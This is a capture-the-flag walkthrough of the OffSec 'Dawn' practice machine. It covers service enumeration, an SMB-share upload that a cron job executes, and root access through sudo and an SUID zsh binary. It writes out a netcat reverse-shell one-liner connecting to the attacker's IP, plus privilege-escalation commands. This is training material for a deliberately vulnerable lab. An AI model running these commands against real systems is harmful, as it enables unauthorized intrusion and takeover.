# Dawn

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Play
Difficulty: Easy
Community Rating: Intermediate
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 5
Lab Description:
This lab demonstrates the exploitation of a misconfigured SMB share and scheduled cron jobs to achieve 
remote code execution. By uploading malicious files to an open SMB share, the attacker leverages a cron 
job to execute them. Privilege escalation is accomplished through a misconfigured SUID binary, zsh, 
which provides root access. This exercise highlights SMB abuse, cron job exploitation, and privilege 
escalation through SUID binaries.
Released: 20 Jul 2020
```

Machine link: [https://portal.offsec.com/machine/dawn-129/overview/details](https://portal.offsec.com/machine/dawn-129/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ export TARGET_IP=192.168.107.11

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ sudo nmap -sC -sV $TARGET_IP                 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 17:28 CET
Nmap scan report for 192.168.107.11
Host is up (0.034s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MariaDB 5.5.5-10.3.15
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 15
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, SupportsLoadDataLocal, FoundRows, SupportsCompression, InteractiveClient, ODBCClient, SupportsTransactions, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, LongColumnFlag, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: OR,&yPc$'6y!5)j]rEAW
|_  Auth Plugin Name: mysql_native_password
Service Info: Host: DAWN

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-02-18T16:28:48
|_  start_date: N/A
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: dawn
|   NetBIOS computer name: DAWN\x00
|   Domain name: dawn
|   FQDN: dawn.dawn
|_  System time: 2026-02-18T11:28:46-05:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.09 seconds
```

We have four services running:

- Apache httpd 2.4.38 on port 80
- Samba smbd 3.X - 4.X on port 139
- Samba smbd 4.9.5-Debian on port 445
- MariaDB 5.5.5-10.3.15 on port 3306

### Check the web site

Browsing manually to port 80 shows a `Website currently under construction, try again later.` message.

We can also run all HTTP-related enumeration scripts in nmap

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ nmap -v -p80 --script "http-enum*" $TARGET_IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 17:40 CET
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:40
Completed NSE at 17:40, 0.00s elapsed
Initiating Ping Scan at 17:40
Scanning 192.168.107.11 [4 ports]
Completed Ping Scan at 17:40, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:40
Completed Parallel DNS resolution of 1 host. at 17:40, 0.06s elapsed
Initiating SYN Stealth Scan at 17:40
Scanning 192.168.107.11 [1 port]
Discovered open port 80/tcp on 192.168.107.11
Completed SYN Stealth Scan at 17:40, 0.06s elapsed (1 total ports)
NSE: Script scanning 192.168.107.11.
Initiating NSE at 17:40
Completed NSE at 17:40, 3.10s elapsed
Nmap scan report for 192.168.107.11
Host is up (0.031s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /logs/: Logs

NSE: Script Post-scanning.
Initiating NSE at 17:40
Completed NSE at 17:40, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.48 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (84B)
```

The `/logs` directory contains four log files:

- auth.log (zero size)
- daemon.log (zero size)
- error.log (zero size)
- management.log

The `management.log` file shows status messages of cron jobs such as

```text
<---snip--->
2020/08/12 09:14:01 [31;1mCMD: UID=0    PID=1174   | /usr/sbin/cron -f [0m
2020/08/12 09:14:01 [31;1mCMD: UID=0    PID=1173   | /usr/sbin/cron -f [0m
2020/08/12 09:14:01 [31;1mCMD: UID=0    PID=1172   | /usr/sbin/cron -f [0m
2020/08/12 09:14:01 [31;1mCMD: UID=33   PID=1186   | /bin/sh -c /home/dawn/ITDEPT/web-control [0m
2020/08/12 09:14:01 [31;1mCMD: UID=0    PID=1185   | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control [0m
2020/08/12 09:14:01 [31;1mCMD: UID=1000 PID=1184   | /bin/sh -c /home/dawn/ITDEPT/product-control [0m
2020/08/12 09:14:01 [31;1mCMD: UID=0    PID=1183   | chmod 777 /home/dawn/ITDEPT/product-control [0m
2020/08/12 09:14:01 [31;1mCMD: UID=33   PID=1181   | /bin/sh -c /home/dawn/ITDEPT/web-control [0m
2020/08/12 09:14:01 [31;1mCMD: UID=1000 PID=1180   | /bin/sh -c /home/dawn/ITDEPT/product-control [0m
2020/08/12 09:14:01 [31;1mCMD: UID=0    PID=1179   | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control [0m
2020/08/12 09:14:01 [31;1mCMD: UID=0    PID=1177   | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control [0m
2020/08/12 09:14:36 [31;1mCMD: UID=0    PID=1187   | /usr/sbin/smbd --foreground --no-process-group [0m
2020/08/12 09:15:01 [31;1mCMD: UID=0    PID=1192   | /usr/sbin/cron -f [0m
2020/08/12 09:15:01 [31;1mCMD: UID=0    PID=1191   | /usr/sbin/cron -f [0m
<---snip--->
```

### Check for files and folders with gobuster

Let's also check for additional files and folders with gobuster

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 32 -x php,txt,html -u http://$TARGET_IP
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.107.11
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 294]
/.php                 (Status: 403) [Size: 293]
/index.html           (Status: 200) [Size: 791]
/logs                 (Status: 200) [Size: 1545]
/cctv                 (Status: 403) [Size: 294]
/.php                 (Status: 403) [Size: 293]
/.html                (Status: 403) [Size: 294]
/server-status        (Status: 403) [Size: 302]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Nothing especially interresting.

### Analyse the Samba SMB service

Next, we analyse the Samba service

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ crackmapexec smb $TARGET_IP -u '' -p '' --shares
SMB         192.168.107.11  445    DAWN             [*] Windows 6.1 (name:DAWN) (domain:dawn) (signing:False) (SMBv1:True)
SMB         192.168.107.11  445    DAWN             [+] dawn\: 
SMB         192.168.107.11  445    DAWN             [+] Enumerated shares
SMB         192.168.107.11  445    DAWN             Share           Permissions     Remark
SMB         192.168.107.11  445    DAWN             -----           -----------     ------
SMB         192.168.107.11  445    DAWN             print$                          Printer Drivers
SMB         192.168.107.11  445    DAWN             ITDEPT          READ,WRITE      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
SMB         192.168.107.11  445    DAWN             IPC$                            IPC Service (Samba 4.9.5-Debian)
```

So we have access to a writable share called `ITDEPT`.

Let's connect to the share and see what we find

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ smbclient -N //$TARGET_IP/ITDEPT -c 'recurse;ls'
  .                                   D        0  Wed Feb 18 17:50:13 2026
  ..                                  D        0  Wed Jul 22 19:19:41 2020

                7158264 blocks of size 1024. 3396672 blocks available
```

The share is empty so far, but we ought to be able to write one of the files we saw earlier in the `management.log` file

- /home/dawn/ITDEPT/web-control
- /home/dawn/ITDEPT/product-control

### Get a reverse shell

Now we can create a reverse shell and write it to the SMB share

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ vi web-control  

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ cat web-control
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.246 12345 >/tmp/f


┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ smbclient -N //$TARGET_IP/ITDEPT                
Try "help" to get a list of possible commands.
smb: \> put web-control
putting file web-control as \web-control (0.9 kb/s) (average 0.9 kb/s)
smb: \> exit
```

Before that, we create a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ nc -lvnp 12345                               
listening on [any] 12345 ...

```

that will accept the connection

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ nc -lvnp 12345                               
listening on [any] 12345 ...
connect to [192.168.45.246] from (UNKNOWN) [192.168.107.11] 43818
bash: cannot set terminal process group (2759): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dawn:~$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@dawn:~$ 
```

### Get the user flag

Now we can start looking for the user flag

```bash
www-data@dawn:~$ cd /home
cd /home
www-data@dawn:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root      root      4096 Aug  2  2019 .
drwxr-xr-x 18 root      root      4096 Mar 16  2020 ..
drwxr-xr-x  5 dawn      dawn      4096 Jul 22  2020 dawn
drwxr-xr-x  4 ganimedes ganimedes 4096 Aug  2  2019 ganimedes
www-data@dawn:/home$ cd dawn    
cd dawn
www-data@dawn:/home/dawn$ ls
ls
ITDEPT
local.txt
www-data@dawn:/home/dawn$ cat local.txt
cat local.txt
f<REDACTED>1
www-data@dawn:/home/dawn$ 
```

Nice, so far so good.

### Upgrade the shell

Next, we want to upgrade and stabilize the shell

```bash
www-data@dawn:/home/dawn$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@dawn:/home/dawn$ ^Z
zsh: suspended  nc -lvnp 12345
                                                                                                                                                                                                             
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Dawn]
└─$ stty raw -echo ; fg ; reset 
[1]  + continued  nc -lvnp 12345

www-data@dawn:/home/dawn$ export SHELL=bash
www-data@dawn:/home/dawn$ export TERM=xterm-256color
www-data@dawn:/home/dawn$ stty rows 200 columns 200
www-data@dawn:/home/dawn$ ^C
www-data@dawn:/home/dawn$ 
www-data@dawn:/home/dawn$ 
```

### Enumeration for privesc

Next, we enumerate the system for privilege escalation opportunities.

We can run `sudo` as `root` with no password

```bash
www-data@dawn:/home/dawn$ sudo -l
Matching Defaults entries for www-data on dawn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/sudo
www-data@dawn:/home/dawn$ 
```

### Get the root flag

```bash
www-data@dawn:/home/dawn$ sudo /usr/bin/sudo ls -l /root
total 8
-rw-r--r-- 1 root root 32 Jul 14  2020 flag.txt
-rw-r--r-- 1 root root 33 Feb 18 11:28 proof.txt
www-data@dawn:/home/dawn$ sudo /usr/bin/sudo cat /root/proof.txt
c<REDACTED>f
www-data@dawn:/home/dawn$ 
```

This is probably not the intended way since it was too easy, so let's continue our enumeration.

### Check for SUID/GUID files

Next, we check for binaries with the SUID or GUID flags set

```bash
www-data@dawn:/home/dawn$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2> /dev/null
   131944     40 -rwxr-sr-x   1 root     shadow      39616 Feb 14  2019 /usr/sbin/unix_chkpwd
   162007     36 -rwsr-xr-x   1 root     root        35600 Jun 17  2018 /usr/sbin/mount.cifs
   151171     12 -rwxr-sr-x   1 root     utmp        10232 Feb 18  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
   143462     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   266373     20 -rwsr-xr-x   1 root     root          18888 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   268427     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   146814    428 -rwsr-xr-x   1 root     root         436552 Apr  8  2019 /usr/lib/openssh/ssh-keysign
   134749     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
   134602     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
   147964     24 -rwsr-xr-x   1 root     root          23288 Jan 15  2019 /usr/bin/pkexec
   132664     36 -rwxr-sr-x   1 root     tty           34896 Jan 10  2019 /usr/bin/wall
   131136     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
   163709    156 -rwsr-xr-x   1 root     root         157192 Jan 12  2019 /usr/bin/sudo
   135083     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
   143657     20 -rwxr-sr-x   1 root     mail          18944 Dec  3  2017 /usr/bin/dotlockfile
   163813    844 -rwsr-xr-x   1 root     root         861568 Feb  4  2019 /usr/bin/zsh
   131130     72 -rwxr-sr-x   1 root     shadow        71816 Jul 27  2018 /usr/bin/chage
   131134     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
   136573     44 -rwxr-sr-x   1 root     crontab       43568 Jun 23  2019 /usr/bin/crontab
   131132     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
   131133     32 -rwxr-sr-x   1 root     shadow        31000 Jul 27  2018 /usr/bin/expiry
   151281     36 -rwsr-xr-x   1 root     root          34896 Jan  7  2019 /usr/bin/fusermount
   135085     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
   131131     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
   136508     16 -rwxr-sr-x   1 root     tty           14736 May  4  2018 /usr/bin/bsd-write
   146807    316 -rwxr-sr-x   1 root     ssh          321672 Apr  8  2019 /usr/bin/ssh-agent
www-data@dawn:/home/dawn$ 
```

A shell (`zsh`) with SUID set. How nice!

```bash
www-data@dawn:/home/dawn$ zsh
dawn# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
dawn# cat /root/proof.txt
c<REDACTED>f
dawn# 
```

And there we have the root flag in another way. Also very easy!

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [CrackMapExec - GitHub](https://github.com/byt3bl33d3r/CrackMapExec)
- [CrackMapExec - Kali Tools](https://www.kali.org/tools/crackmapexec/)
- [CrackMapExec - Wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [Gobuster - GitHub](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [MariaDB - Wikipedia](https://en.wikipedia.org/wiki/MariaDB)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Samba (software) - Wikipedia](https://en.wikipedia.org/wiki/Samba_(software))
- [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [smbclient - Kali Tools](https://www.kali.org/tools/samba/#smbclient)
- [smbclient - Linux manual page](https://linux.die.net/man/1/smbclient)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [Z shell - Wikipedia](https://en.wikipedia.org/wiki/Z_shell)
